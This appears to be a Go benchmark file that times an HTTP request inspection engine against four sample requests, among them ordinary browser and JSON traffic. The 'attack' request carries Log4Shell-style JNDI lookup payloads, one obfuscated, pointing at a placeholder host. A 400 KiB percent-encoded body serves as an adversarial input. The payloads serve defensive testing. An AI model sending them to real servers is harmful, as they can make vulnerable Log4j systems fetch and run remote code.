package engine

import (
	"strings"
	"testing"
)

func BenchmarkInspect(b *testing.B) {
	browser := Request{
		Method: "GET",
		Target: "/products/list?category=books&page=2&sort=price",
		Headers: []Header{
			{"Host", "shop.example.com"},
			{"User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"},
			{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
			{"Accept-Language", "en-US,en;q=0.9"},
			{"Accept-Encoding", "gzip, deflate, br"},
			{"Cookie", "session=9f8a7d6c5b4a39281716; theme=dark; consent=1"},
			{"Referer", "https://shop.example.com/"},
		},
	}
	jsonPost := Request{
		Method: "POST",
		Target: "/api/v1/orders",
		Headers: []Header{
			{"Host", "shop.example.com"},
			{"Content-Type", "application/json"},
			{"Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyLTEyMyJ9.c2lnbmF0dXJl"},
		},
		Body: []byte(`{"items":[{"sku":"A-1","qty":2},{"sku":"B-9","qty":1}],"note":"leave at the door"}`),
	}
	attack := Request{
		Method: "GET",
		Target: "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.invalid%2Fa%7D",
		Headers: []Header{
			{"Host", "shop.example.com"},
			{"User-Agent", "${${lower:j}${upper:n}${lower:d}i:${lower:l}dap://x.invalid/a}"},
		},
	}
	adversarial := Request{
		Method:  "POST",
		Target:  "/",
		Headers: []Header{{"Content-Type", "text/plain"}},
		Body:    []byte(strings.Repeat("%25", 200000)),
	}

	for _, bc := range []struct {
		name string
		req  Request
	}{
		{"browser-GET", browser},
		{"JSON-POST", jsonPost},
		{"attack", attack},
		{"adversarial-400KiB-percent", adversarial},
	} {
		b.Run(bc.name, func(b *testing.B) {
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				_ = Inspect(bc.req, Config{})
			}
		})
	}
}
